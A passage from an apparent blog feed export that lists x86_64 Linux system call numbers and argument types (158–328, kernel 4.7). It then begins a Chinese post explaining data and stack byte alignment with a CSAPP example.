arg5</td></tr><tr><td>158</td><td>sys_arch_prctl</td><td>struct task_struct *task</td><td>int code</td><td>unsigned long *addr</td><td></td><td></td><td></td></tr><tr><td>159</td><td>sys_adjtimex</td><td>struct timex *txc_p</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>160</td><td>sys_setrlimit</td><td>unsigned int resource</td><td>struct rlimit *rlim</td><td></td><td></td><td></td><td></td></tr><tr><td>161</td><td>sys_chroot</td><td>const char *filename</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>162</td><td>sys_sync</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>163</td><td>sys_acct</td><td>const char *name</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>164</td><td>sys_settimeofday</td><td>struct timeval *tv</td><td>struct timezone *tz</td><td></td><td></td><td></td><td></td></tr><tr><td>165</td><td>sys_mount</td><td>char *dev_name</td><td>char *dir_name</td><td>char *type</td><td>unsigned long flags</td><td>void *data</td><td></td></tr><tr><td>166</td><td>sys_umount2</td><td>const char *target</td><td>int flags</td><td></td><td></td><td></td><td></td></tr><tr><td>167</td><td>sys_swapon</td><td>const char *specialfile</td><td>int swap_flags</td><td></td><td></td><td></td><td></td></tr><tr><td>168</td><td>sys_swapoff</td><td>const char *specialfile</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>169</td><td>sys_reboot</td><td>int magic1</td><td>int magic2</td><td>unsigned int cmd</td><td>void *arg</td><td></td><td></td></tr><tr><td>170</td><td>sys_sethostname</td><td>char *name</td><td>int len</td><td></td><td></td><td></td><td></td></tr><tr><td>171</td><td>sys_setdomainname</td><td>char *name</td><td>int len</td><td></td><td></td><td></td><td></td></tr><tr><td>172</td><td>sys_iopl</td><td>unsigned int level</td><td>struct pt_regs *regs</td><td></td><td></td><td></td><td></td></tr><tr><td>173</td><td>sys_ioperm</td><td>unsigned long from</td><td>unsigned long num</td><td>int turn_on</td><td></td><td></td><td></td></tr><tr><td>174</td><td>sys_create_module</td><td>REMOVED IN Linux 2.6</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>175</td><td>sys_init_module</td><td>void *umod</td><td>unsigned long len</td><td>const char *uargs</td><td></td><td></td><td></td></tr><tr><td>176</td><td>sys_delete_module</td><td>const chat *name_user</td><td>unsigned int flags</td><td></td><td></td><td></td><td></td></tr><tr><td>177</td><td>sys_get_kernel_syms</td><td>REMOVED IN Linux 2.6</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>178</td><td>sys_query_module</td><td>REMOVED IN Linux 2.6</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>179</td><td>sys_quotactl</td><td>unsigned int cmd</td><td>const char *special</td><td>qid_t id</td><td>void *addr</td><td></td><td></td></tr><tr><td>180</td><td>sys_nfsservctl</td><td>NOT IMPLEMENTED</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>181</td><td>sys_getpmsg</td><td>NOT IMPLEMENTED</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>182</td><td>sys_putpmsg</td><td>NOT IMPLEMENTED</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>183</td><td>sys_afs_syscall</td><td>NOT IMPLEMENTED</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>184</td><td>sys_tuxcall</td><td>NOT IMPLEMENTED</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>185</td><td>sys_security</td><td>NOT IMPLEMENTED</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>186</td><td>sys_gettid</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>187</td><td>sys_readahead</td><td>int fd</td><td>loff_t offset</td><td>size_t count</td><td></td><td></td><td></td></tr><tr><td>188</td><td>sys_setxattr</td><td>const char *pathname</td><td>const char *name</td><td>const void *value</td><td>size_t size</td><td>int flags</td><td></td></tr><tr><td>189</td><td>sys_lsetxattr</td><td>const char *pathname</td><td>const char *name</td><td>const void *value</td><td>size_t size</td><td>int flags</td><td></td></tr><tr><td>190</td><td>sys_fsetxattr</td><td>int fd</td><td>const char *name</td><td>const void *value</td><td>size_t size</td><td>int flags</td><td></td></tr><tr><td>191</td><td>sys_getxattr</td><td>const char *pathname</td><td>const char *name</td><td>void *value</td><td>size_t size</td><td></td><td></td></tr><tr><td>192</td><td>sys_lgetxattr</td><td>const char *pathname</td><td>const char *name</td><td>void *value</td><td>size_t size</td><td></td><td></td></tr><tr><td>193</td><td>sys_fgetxattr</td><td>int fd</td><td>const har *name</td><td>void *value</td><td>size_t size</td><td></td><td></td></tr><tr><td>194</td><td>sys_listxattr</td><td>const char *pathname</td><td>char *list</td><td>size_t size</td><td></td><td></td><td></td></tr><tr><td>195</td><td>sys_llistxattr</td><td>const char *pathname</td><td>char *list</td><td>size_t size</td><td></td><td></td><td></td></tr><tr><td>196</td><td>sys_flistxattr</td><td>int fd</td><td>char *list</td><td>size_t size</td><td></td><td></td><td></td></tr><tr><td>197</td><td>sys_removexattr</td><td>const char *pathname</td><td>const char *name</td><td></td><td></td><td></td><td></td></tr><tr><td>198</td><td>sys_lremovexattr</td><td>const char *pathname</td><td>const char *name</td><td></td><td></td><td></td><td></td></tr><tr><td>199</td><td>sys_fremovexattr</td><td>int fd</td><td>const char *name</td><td></td><td></td><td></td><td></td></tr><tr><td>200</td><td>sys_tkill</td><td>pid_t pid</td><td>ing sig</td><td></td><td></td><td></td><td></td></tr><tr><td>201</td><td>sys_time</td><td>time_t *tloc</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>202</td><td>sys_futex</td><td>u32 *uaddr</td><td>int op</td><td>u32 val</td><td>struct timespec *utime</td><td>u32 *uaddr2</td><td>u32 val3</td></tr><tr><td>203</td><td>sys_sched_setaffinity</td><td>pid_t pid</td><td>unsigned int len</td><td>unsigned long *user_mask_ptr</td><td></td><td></td><td></td></tr><tr><td>204</td><td>sys_sched_getaffinity</td><td>pid_t pid</td><td>unsigned int len</td><td>unsigned long *user_mask_ptr</td><td></td><td></td><td></td></tr><tr><td>205</td><td>sys_set_thread_area</td><td>NOT IMPLEMENTED. Use arch_prctl</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>206</td><td>sys_io_setup</td><td>unsigned nr_events</td><td>aio_context_t *ctxp</td><td></td><td></td><td></td><td></td></tr><tr><td>207</td><td>sys_io_destroy</td><td>aio_context_t ctx</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>208</td><td>sys_io_getevents</td><td>aio_context_t ctx_id</td><td>long min_nr</td><td>long nr</td><td>struct io_event *events</td><td></td><td></td></tr><tr><td>209</td><td>sys_io_submit</td><td>aio_context_t ctx_id</td><td>long nr</td><td>struct iocb **iocbpp</td><td></td><td></td><td></td></tr><tr><td>210</td><td>sys_io_cancel</td><td>aio_context_t ctx_id</td><td>struct iocb *iocb</td><td>struct io_event *result</td><td></td><td></td><td></td></tr><tr><td>211</td><td>sys_get_thread_area</td><td>NOT IMPLEMENTED. Use arch_prctl</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>212</td><td>sys_lookup_dcookie</td><td>u64 cookie64</td><td>long buf</td><td>long len</td><td></td><td></td><td></td></tr><tr><td>213</td><td>sys_epoll_create</td><td>int size</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>214</td><td>sys_epoll_ctl_old</td><td>NOT IMPLEMENTED</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>215</td><td>sys_epoll_wait_old</td><td>NOT IMPLEMENTED</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>216</td><td>sys_remap_file_pages</td><td>unsigned long start</td><td>unsigned long size</td><td>unsigned long prot</td><td>unsigned long pgoff</td><td>unsigned long flags</td><td></td></tr><tr><td>217</td><td>sys_getdents64</td><td>unsigned int fd</td><td>struct linux_dirent64 *dirent</td><td>unsigned int count</td><td></td><td></td><td></td></tr><tr><td>218</td><td>sys_set_tid_address</td><td>int *tidptr</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>219</td><td>sys_restart_syscall</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>220</td><td>sys_semtimedop</td><td>int semid</td><td>struct sembuf *tsops</td><td>unsigned nsops</td><td>const struct timespec *timeout</td><td></td><td></td></tr><tr><td>221</td><td>sys_fadvise64</td><td>int fd</td><td>loff_t offset</td><td>size_t len</td><td>int advice</td><td></td><td></td></tr><tr><td>222</td><td>sys_timer_create</td><td>const clockid_t which_clock</td><td>struct sigevent *timer_event_spec</td><td>timer_t *created_timer_id</td><td></td><td></td><td></td></tr><tr><td>223</td><td>sys_timer_settime</td><td>timer_t timer_id</td><td>int flags</td><td>const struct itimerspec *new_setting</td><td>struct itimerspec *old_setting</td><td></td><td></td></tr><tr><td>224</td><td>sys_timer_gettime</td><td>timer_t timer_id</td><td>struct itimerspec *setting</td><td></td><td></td><td></td><td></td></tr><tr><td>225</td><td>sys_timer_getoverrun</td><td>timer_t timer_id</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>226</td><td>sys_timer_delete</td><td>timer_t timer_id</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>227</td><td>sys_clock_settime</td><td>const clockid_t which_clock</td><td>const struct timespec *tp</td><td></td><td></td><td></td><td></td></tr><tr><td>228</td><td>sys_clock_gettime</td><td>const clockid_t which_clock</td><td>struct timespec *tp</td><td></td><td></td><td></td><td></td></tr><tr><td>229</td><td>sys_clock_getres</td><td>const clockid_t which_clock</td><td>struct timespec *tp</td><td></td><td></td><td></td><td></td></tr><tr><td>230</td><td>sys_clock_nanosleep</td><td>const clockid_t which_clock</td><td>int flags</td><td>const struct timespec *rqtp</td><td>struct timespec *rmtp</td><td></td><td></td></tr><tr><td>231</td><td>sys_exit_group</td><td>int error_code</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>232</td><td>sys_epoll_wait</td><td>int epfd</td><td>struct epoll_event *events</td><td>int maxevents</td><td>int timeout</td><td></td><td></td></tr><tr><td>233</td><td>sys_epoll_ctl</td><td>int epfd</td><td>int op</td><td>int fd</td><td>struct epoll_event *event</td><td></td><td></td></tr><tr><td>234</td><td>sys_tgkill</td><td>pid_t tgid</td><td>pid_t pid</td><td>int sig</td><td></td><td></td><td></td></tr><tr><td>235</td><td>sys_utimes</td><td>char *filename</td><td>struct timeval *utimes</td><td></td><td></td><td></td><td></td></tr><tr><td>236</td><td>sys_vserver</td><td>NOT IMPLEMENTED</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>237</td><td>sys_mbind</td><td>unsigned long start</td><td>unsigned long len</td><td>unsigned long mode</td><td>unsigned long *nmask</td><td>unsigned long maxnode</td><td>unsigned flags</td></tr><tr><td>238</td><td>sys_set_mempolicy</td><td>int mode</td><td>unsigned long *nmask</td><td>unsigned long maxnode</td><td></td><td></td><td></td></tr><tr><td>239</td><td>sys_get_mempolicy</td><td>int *policy</td><td>unsigned long *nmask</td><td>unsigned long maxnode</td><td>unsigned long addr</td><td>unsigned long flags</td><td></td></tr><tr><td>240</td><td>sys_mq_open</td><td>const char *u_name</td><td>int oflag</td><td>mode_t mode</td><td>struct mq_attr *u_attr</td><td></td><td></td></tr><tr><td>241</td><td>sys_mq_unlink</td><td>const char *u_name</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>242</td><td>sys_mq_timedsend</td><td>mqd_t mqdes</td><td>const char *u_msg_ptr</td><td>size_t msg_len</td><td>unsigned int msg_prio</td><td>const stuct timespec *u_abs_timeout</td><td></td></tr><tr><td>243</td><td>sys_mq_timedreceive</td><td>mqd_t mqdes</td><td>char *u_msg_ptr</td><td>size_t msg_len</td><td>unsigned int *u_msg_prio</td><td>const struct timespec *u_abs_timeout</td><td></td></tr><tr><td>244</td><td>sys_mq_notify</td><td>mqd_t mqdes</td><td>const struct sigevent *u_notification</td><td></td><td></td><td></td><td></td></tr><tr><td>245</td><td>sys_mq_getsetattr</td><td>mqd_t mqdes</td><td>const struct mq_attr *u_mqstat</td><td>struct mq_attr *u_omqstat</td><td></td><td></td><td></td></tr><tr><td>246</td><td>sys_kexec_load</td><td>unsigned long entry</td><td>unsigned long nr_segments</td><td>struct kexec_segment *segments</td><td>unsigned long flags</td><td></td><td></td></tr><tr><td>247</td><td>sys_waitid</td><td>int which</td><td>pid_t upid</td><td>struct siginfo *infop</td><td>int options</td><td>struct rusage *ru</td><td></td></tr><tr><td>248</td><td>sys_add_key</td><td>const char *_type</td><td>const char *_description</td><td>const void *_payload</td><td>size_t plen</td><td></td><td></td></tr><tr><td>249</td><td>sys_request_key</td><td>const char *_type</td><td>const char *_description</td><td>const char *_callout_info</td><td>key_serial_t destringid</td><td></td><td></td></tr><tr><td>250</td><td>sys_keyctl</td><td>int option</td><td>unsigned long arg2</td><td>unsigned long arg3</td><td>unsigned long arg4</td><td>unsigned long arg5</td><td></td></tr><tr><td>251</td><td>sys_ioprio_set</td><td>int which</td><td>int who</td><td>int ioprio</td><td></td><td></td><td></td></tr><tr><td>252</td><td>sys_ioprio_get</td><td>int which</td><td>int who</td><td></td><td></td><td></td><td></td></tr><tr><td>253</td><td>sys_inotify_init</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>254</td><td>sys_inotify_add_watch</td><td>int fd</td><td>const char *pathname</td><td>u32 mask</td><td></td><td></td><td></td></tr><tr><td>255</td><td>sys_inotify_rm_watch</td><td>int fd</td><td>__s32 wd</td><td></td><td></td><td></td><td></td></tr><tr><td>256</td><td>sys_migrate_pages</td><td>pid_t pid</td><td>unsigned long maxnode</td><td>const unsigned long *old_nodes</td><td>const unsigned long *new_nodes</td><td></td><td></td></tr><tr><td>257</td><td>sys_openat</td><td>int dfd</td><td>const char *filename</td><td>int flags</td><td>int mode</td><td></td><td></td></tr><tr><td>258</td><td>sys_mkdirat</td><td>int dfd</td><td>const char *pathname</td><td>int mode</td><td></td><td></td><td></td></tr><tr><td>259</td><td>sys_mknodat</td><td>int dfd</td><td>const char *filename</td><td>int mode</td><td>unsigned dev</td><td></td><td></td></tr><tr><td>260</td><td>sys_fchownat</td><td>int dfd</td><td>const char *filename</td><td>uid_t user</td><td>gid_t group</td><td>int flag</td><td></td></tr><tr><td>261</td><td>sys_futimesat</td><td>int dfd</td><td>const char *filename</td><td>struct timeval *utimes</td><td></td><td></td><td></td></tr><tr><td>262</td><td>sys_newfstatat</td><td>int dfd</td><td>const char *filename</td><td>struct stat *statbuf</td><td>int flag</td><td></td><td></td></tr><tr><td>263</td><td>sys_unlinkat</td><td>int dfd</td><td>const char *pathname</td><td>int flag</td><td></td><td></td><td></td></tr><tr><td>264</td><td>sys_renameat</td><td>int oldfd</td><td>const char *oldname</td><td>int newfd</td><td>const char *newname</td><td></td><td></td></tr><tr><td>265</td><td>sys_linkat</td><td>int oldfd</td><td>const char *oldname</td><td>int newfd</td><td>const char *newname</td><td>int flags</td><td></td></tr><tr><td>266</td><td>sys_symlinkat</td><td>const char *oldname</td><td>int newfd</td><td>const char *newname</td><td></td><td></td><td></td></tr><tr><td>267</td><td>sys_readlinkat</td><td>int dfd</td><td>const char *pathname</td><td>char *buf</td><td>int bufsiz</td><td></td><td></td></tr><tr><td>268</td><td>sys_fchmodat</td><td>int dfd</td><td>const char *filename</td><td>mode_t mode</td><td></td><td></td><td></td></tr><tr><td>269</td><td>sys_faccessat</td><td>int dfd</td><td>const char *filename</td><td>int mode</td><td></td><td></td><td></td></tr><tr><td>270</td><td>sys_pselect6</td><td>int n</td><td>fd_set *inp</td><td>fd_set *outp</td><td>fd_set *exp</td><td>struct timespec *tsp</td><td>void *sig</td></tr><tr><td>271</td><td>sys_ppoll</td><td>struct pollfd *ufds</td><td>unsigned int nfds</td><td>struct timespec *tsp</td><td>const sigset_t *sigmask</td><td>size_t sigsetsize</td><td></td></tr><tr><td>272</td><td>sys_unshare</td><td>unsigned long unshare_flags</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>273</td><td>sys_set_robust_list</td><td>struct robust_list_head *head</td><td>size_t len</td><td></td><td></td><td></td><td></td></tr><tr><td>274</td><td>sys_get_robust_list</td><td>int pid</td><td>struct robust_list_head **head_ptr</td><td>size_t *len_ptr</td><td></td><td></td><td></td></tr><tr><td>275</td><td>sys_splice</td><td>int fd_in</td><td>loff_t *off_in</td><td>int fd_out</td><td>loff_t *off_out</td><td>size_t len</td><td>unsigned int flags</td></tr><tr><td>276</td><td>sys_tee</td><td>int fdin</td><td>int fdout</td><td>size_t len</td><td>unsigned int flags</td><td></td><td></td></tr><tr><td>277</td><td>sys_sync_file_range</td><td>long fd</td><td>loff_t offset</td><td>loff_t bytes</td><td>long flags</td><td></td><td></td></tr><tr><td>278</td><td>sys_vmsplice</td><td>int fd</td><td>const struct iovec *iov</td><td>unsigned long nr_segs</td><td>unsigned int flags</td><td></td><td></td></tr><tr><td>279</td><td>sys_move_pages</td><td>pid_t pid</td><td>unsigned long nr_pages</td><td>const void **pages</td><td>const int *nodes</td><td>int *status</td><td>int flags</td></tr><tr><td>280</td><td>sys_utimensat</td><td>int dfd</td><td>const char *filename</td><td>struct timespec *utimes</td><td>int flags</td><td></td><td></td></tr><tr><td>281</td><td>sys_epoll_pwait</td><td>int epfd</td><td>struct epoll_event *events</td><td>int maxevents</td><td>int timeout</td><td>const sigset_t *sigmask</td><td>size_t sigsetsize</td></tr><tr><td>282</td><td>sys_signalfd</td><td>int ufd</td><td>sigset_t *user_mask</td><td>size_t sizemask</td><td></td><td></td><td></td></tr><tr><td>283</td><td>sys_timerfd_create</td><td>int clockid</td><td>int flags</td><td></td><td></td><td></td><td></td></tr><tr><td>284</td><td>sys_eventfd</td><td>unsigned int count</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>285</td><td>sys_fallocate</td><td>long fd</td><td>long mode</td><td>loff_t offset</td><td>loff_t len</td><td></td><td></td></tr><tr><td>286</td><td>sys_timerfd_settime</td><td>int ufd</td><td>int flags</td><td>const struct itimerspec *utmr</td><td>struct itimerspec *otmr</td><td></td><td></td></tr><tr><td>287</td><td>sys_timerfd_gettime</td><td>int ufd</td><td>struct itimerspec *otmr</td><td></td><td></td><td></td><td></td></tr><tr><td>288</td><td>sys_accept4</td><td>int fd</td><td>struct sockaddr *upeer_sockaddr</td><td>int *upeer_addrlen</td><td>int flags</td><td></td><td></td></tr><tr><td>289</td><td>sys_signalfd4</td><td>int ufd</td><td>sigset_t *user_mask</td><td>size_t sizemask</td><td>int flags</td><td></td><td></td></tr><tr><td>290</td><td>sys_eventfd2</td><td>unsigned int count</td><td>int flags</td><td></td><td></td><td></td><td></td></tr><tr><td>291</td><td>sys_epoll_create1</td><td>int flags</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>292</td><td>sys_dup3</td><td>unsigned int oldfd</td><td>unsigned int newfd</td><td>int flags</td><td></td><td></td><td></td></tr><tr><td>293</td><td>sys_pipe2</td><td>int *filedes</td><td>int flags</td><td></td><td></td><td></td><td></td></tr><tr><td>294</td><td>sys_inotify_init1</td><td>int flags</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>295</td><td>sys_preadv</td><td>unsigned long fd</td><td>const struct iovec *vec</td><td>unsigned long vlen</td><td>unsigned long pos_l</td><td>unsigned long pos_h</td><td></td></tr><tr><td>296</td><td>sys_pwritev</td><td>unsigned long fd</td><td>const struct iovec *vec</td><td>unsigned long vlen</td><td>unsigned long pos_l</td><td>unsigned long pos_h</td><td></td></tr><tr><td>297</td><td>sys_rt_tgsigqueueinfo</td><td>pid_t tgid</td><td>pid_t pid</td><td>int sig</td><td>siginfo_t *uinfo</td><td></td><td></td></tr><tr><td>298</td><td>sys_perf_event_open</td><td>struct perf_event_attr *attr_uptr</td><td>pid_t pid</td><td>int cpu</td><td>int group_fd</td><td>unsigned long flags</td><td></td></tr><tr><td>299</td><td>sys_recvmmsg</td><td>int fd</td><td>struct msghdr *mmsg</td><td>unsigned int vlen</td><td>unsigned int flags</td><td>struct timespec *timeout</td><td></td></tr><tr><td>300</td><td>sys_fanotify_init</td><td>unsigned int flags</td><td>unsigned int event_f_flags</td><td></td><td></td><td></td><td></td></tr><tr><td>301</td><td>sys_fanotify_mark</td><td>long fanotify_fd</td><td>long flags</td><td>__u64 mask</td><td>long dfd</td><td>long pathname</td><td></td></tr><tr><td>302</td><td>sys_prlimit64</td><td>pid_t pid</td><td>unsigned int resource</td><td>const struct rlimit64 *new_rlim</td><td>struct rlimit64 *old_rlim</td><td></td><td></td></tr><tr><td>303</td><td>sys_name_to_handle_at</td><td>int dfd</td><td>const char *name</td><td>struct file_handle *handle</td><td>int *mnt_id</td><td>int flag</td><td></td></tr><tr><td>304</td><td>sys_open_by_handle_at</td><td>int dfd</td><td>const char *name</td><td>struct file_handle *handle</td><td>int *mnt_id</td><td>int flags</td><td></td></tr><tr><td>305</td><td>sys_clock_adjtime</td><td>clockid_t which_clock</td><td>struct timex *tx</td><td></td><td></td><td></td><td></td></tr><tr><td>306</td><td>sys_syncfs</td><td>int fd</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>307</td><td>sys_sendmmsg</td><td>int fd</td><td>struct mmsghdr *mmsg</td><td>unsigned int vlen</td><td>unsigned int flags</td><td></td><td></td></tr><tr><td>308</td><td>sys_setns</td><td>int fd</td><td>int nstype</td><td></td><td></td><td></td><td></td></tr><tr><td>309</td><td>sys_getcpu</td><td>unsigned *cpup</td><td>unsigned *nodep</td><td>struct getcpu_cache *unused</td><td></td><td></td><td></td></tr><tr><td>310</td><td>sys_process_vm_readv</td><td>pid_t pid</td><td>const struct iovec *lvec</td><td>unsigned long liovcnt</td><td>const struct iovec *rvec</td><td>unsigned long riovcnt</td><td>unsigned long flags</td></tr><tr><td>311</td><td>sys_process_vm_writev</td><td>pid_t pid</td><td>const struct iovec *lvec</td><td>unsigned long liovcnt</td><td>const struct iovcc *rvec</td><td>unsigned long riovcnt</td><td>unsigned long flags</td></tr><tr><td>312</td><td>sys_kcmp</td><td>pid_t pid1</td><td>pid_t pid2</td><td>int type</td><td>unsigned long idx1</td><td>unsigned long idx2</td><td></td></tr><tr><td>313</td><td>sys_finit_module</td><td>int fd</td><td>const char __user *uargs</td><td>int flags</td><td></td><td></td><td></td></tr><tr><td>314</td><td>sys_sched_setattr</td><td>pid_t pid</td><td>struct sched_attr __user *attr</td><td>unsigned int flags</td><td></td><td></td><td></td></tr><tr><td>315</td><td>sys_sched_getattr</td><td>pid_t pid</td><td>struct sched_attr __user *attr</td><td>unsigned int size</td><td>unsigned int flags</td><td></td><td></td></tr><tr><td>316</td><td>sys_renameat2</td><td>int olddfd</td><td>const char __user *oldname</td><td>int newdfd</td><td>const char __user *newname</td><td>unsigned int flags</td><td></td></tr><tr><td>317</td><td>sys_seccomp</td><td>unsigned int op</td><td>unsigned int flags</td><td>const char __user *uargs</td><td></td><td></td><td></td></tr><tr><td>318</td><td>sys_getrandom</td><td>char __user *buf</td><td>size_t count</td><td>unsigned int flags</td><td></td><td></td><td></td></tr><tr><td>319</td><td>sys_memfd_create</td><td>const char __user *uname_ptr</td><td>unsigned int flags</td><td></td><td></td><td></td><td></td></tr><tr><td>320</td><td>sys_kexec_file_load</td><td>int kernel_fd</td><td>int initrd_fd</td><td>unsigned long cmdline_len</td><td>const char __user *cmdline_ptr</td><td>unsigned long flags</td><td></td></tr><tr><td>321</td><td>sys_bpf</td><td>int cmd</td><td>union bpf_attr *attr</td><td>unsigned int size</td><td></td><td></td><td></td></tr><tr><td>322</td><td>stub_execveat</td><td>int dfd</td><td>const char __user *filename</td><td>const char __user *const __user *argv</td><td>const char __user *const __user *envp</td><td>int flags</td><td></td></tr><tr><td>323</td><td>userfaultfd</td><td>int flags</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>324</td><td>membarrier</td><td>int cmd</td><td>int flags</td><td></td><td></td><td></td><td></td></tr><tr><td>325</td><td>mlock2</td><td>unsigned long start</td><td>size_t len</td><td>int flags</td><td></td><td></td><td></td></tr><tr><td>326</td><td>copy_file_range</td><td>int fd_in</td><td>loff_t __user *off_in</td><td>int fd_out</td><td>loff_t __user * off_out</td><td>size_t len</td><td>unsigned int flags</td></tr><tr><td>327</td><td>preadv2</td><td>unsigned long fd</td><td>const struct iovec __user *vec</td><td>unsigned long vlen</td><td>unsigned long pos_l</td><td>unsigned long pos_h</td><td>int flags</td></tr><tr><td>328</td><td>pwritev2</td><td>unsigned long fd</td><td>const struct iovec __user *vec</td><td>unsigned long vlen</td><td>unsigned long pos_l</td><td>unsigned long pos_h</td><td>int flags</td></tr></tbody></table>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;内核版本 Linux 4.7&lt;/p&gt;
&lt;p&gt;Note:64位系统中，不再使用&lt;code&gt;int 0x80&lt;/code&gt;来进行系统调用，取而代之的是&lt;code&gt;syscall&lt;/code&gt;指令&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;%rax&lt;/th&gt;
&lt;t
      
    
    </summary>
    
      <category term="Linux" scheme="https://mingliangliu.com/categories/Linux/"/>
    
    
      <category term="汇编" scheme="https://mingliangliu.com/tags/%E6%B1%87%E7%BC%96/"/>
    
      <category term="Linux" scheme="https://mingliangliu.com/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>x86_64 Linux 运行时栈的字节对齐</title>
    <link href="https://mingliangliu.com/2019/08/11/x86-64-Linux-%E8%BF%90%E8%A1%8C%E6%97%B6%E6%A0%88%E7%9A%84%E5%AD%97%E8%8A%82%E5%AF%B9%E9%BD%90/"/>
    <id>https://mingliangliu.com/2019/08/11/x86-64-Linux-运行时栈的字节对齐/</id>
    <published>2019-08-10T16:02:09.000Z</published>
    <updated>2019-09-24T15:09:27.182Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>C语言的过程调用机制（即函数之间的调用）的一个关键特性（起始大多数编程语言也是如此）都是使用了栈数据结构提供的后进先出的内存管理原则。每一个函数的栈空间被称为栈帧，一个栈帧上包含了保存的寄存器、分配给局部变量的空间以及传递给要调用函数的参数等等。一个基本的栈结构如下图所示：</p><img src="/images/运行时栈的字节对齐1.jpg"><p>但是，有一点需要引起注意的是，过程调用的参数是通过栈来传递的，并且分配的局部变量也在栈上，那么对于不同字节长度的参数或变量，是如何在栈上为它们分配空间的？这里所涉及的就是我们要探讨的字节对齐。</p><p>本文示例用到的环境如下：</p><ul><li>Ubuntu x86_64 GNU/Linux</li><li>gcc 7.4.0</li></ul><h2 id="数据对齐"><a href="#数据对齐" class="headerlink" title="数据对齐"></a>数据对齐</h2><p>许多计算机系统对基本数据类型的合法地址做了一些限制，要求某种类型对象的地址必须是某个值K的倍数，其中K具体如下图。这种对齐限制简化了形成处理器和内存系统之间接口的硬件设计。举个实际的例子：比如我们在内存中读取一个8字节长度的变量，那么这个变量所在的地址必须是8的倍数。如果这个变量所在的地址是8的倍数，那么就可以通过一次内存操作完成该变量的读取。倘若这个变量所在的地址并不是8的倍数，那么可能就需要执行两次内存读取，因为该变量被放在两个8字节的内存块中了。</p><table><thead><tr><th align="center">K</th><th align="center">类型</th></tr></thead><tbody><tr><td align="center">1</td><td align="center">char</td></tr><tr><td align="center">2</td><td align="center">short</td></tr><tr><td align="center">4</td><td align="center">int, float</td></tr><tr><td align="center">8</td><td align="center">long,double,char*</td></tr></tbody></table><p>无论数据是否对齐，x86_64硬件都能正常工作，但是却会降低系统的性能，所以我们的编译器在编译时一般会为我们实施数据对齐。</p><h2 id="栈的字节对齐"><a href="#栈的字节对齐" class="headerlink" title="栈的字节对齐"></a>栈的字节对齐</h2><p>栈的字节对齐，实际是指栈顶指针必须须是16字节的整数倍。栈对齐帮助在尽可能少的内存访问周期内读取数据，不对齐堆栈指针可能导致严重的性能下降。</p><p>上文我们说，即使数据没有对齐，我们的程序也是可以执行的，只是效率有点低而已，但是某些型号的Intel和AMD处理器对于有些实现多媒体操作的SSE指令，如果数据没有对齐的话，就无法正确执行。这些指令对16字节内存进行操作，在SSE单元和内存之间传送数据的指令要求内存地址必须是16的倍数。</p><p>因此，任何针对x86_64处理器的编译器和运行时系统都必须保证分配用来保存可能会被SSE寄存器读或写的数据结构的内存，都必须是16字节对齐的，这就形成了一种标准：</p><ul><li>任何内存分配函数（alloca, malloc, calloc或realloc）生成的块起始地址都必须是16的倍数。</li><li>大多数函数的栈帧的边界都必须是16直接的倍数。</li></ul><p>如上，在运行时栈中，不仅传递的参数和局部变量要满足字节对齐，我们的栈指针（%rsp）也必须是16的倍数。</p><h2 id="三个示例"><a href="#三个示例" class="headerlink" title="三个示例"></a>三个示例</h2><p>我们用三个实际的例子来看一看为了实现数据对齐和栈字节对齐，栈空间的分配具体是怎样的。</p><p>如下是CSAPP上的一个示例程序。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">proc</span><span class="params">(<span class="keyword">long</span>  a1, <span class="keyword">long</span>  *a1p,</span></span></span><br><span class="line"><span class="function"><span class="params">          <span class="keyword">int</span>   a2, <span class="keyword">int</span>   *a2p,</span></span></span><br><span class="line"><span class="function"><span class="params">          <span class="keyword">short</span> a3, <span class="keyword">short</span> *a3p,</span></span></span><br><span class="line"><span class="function"><span class="params">          <span class="keyword">char</span>  a4, <span class="keyword">char</span>  *a4p)</span> </span>&#123;</span><br><span class="line">    *a1p += 